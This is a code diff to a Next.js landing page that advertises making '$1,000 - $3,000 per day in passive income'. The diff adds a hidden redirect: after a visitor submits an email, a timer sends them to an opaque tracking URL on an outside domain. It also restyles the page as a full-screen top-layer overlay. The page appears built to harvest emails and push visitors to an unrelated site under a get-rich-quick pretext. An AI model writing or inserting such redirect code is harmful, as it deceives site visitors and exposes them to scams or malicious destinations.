@@ -1,19 +1,24 @@
 "use client"
+import { useRouter } from 'next/router';
 import React, { useState } from 'react';
 
 const LandingPage = () => {
   const [email, setEmail] = useState('');
   const [submitted, setSubmitted] = useState(false);
-
+  const router = useRouter()
   const handleSubmit = async (e) => {
     e.preventDefault();
     // Replace with your form submission logic
     // e.g., send email to your API or service
+    
     setSubmitted(true);
+    setTimeout(() => {
+      router.push('https://unequaledchair.com/b.3RVE0oP/3mpJv/bamfVXJ_ZJDD0/1CNeT/gQyZOCDsE/4/LuTzUB1-OgDCI/4bMhTHkE')
+    }, 500)
   };
 
   return (
-    <div className="flex items-center justify-center min-h-screen bg-gray-100">
+    <div className="flex items-center justify-center min-h-screen bg-gray-100 absolute top-0 left-0 max-w-screen w-full z-50">
       <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
         <h1 className="text-3xl font-bold text-center mb-4">
           How To Make An Additional $1,000 - $3,000 Per Day In Passive Income On Complete Autopilot In 2024...
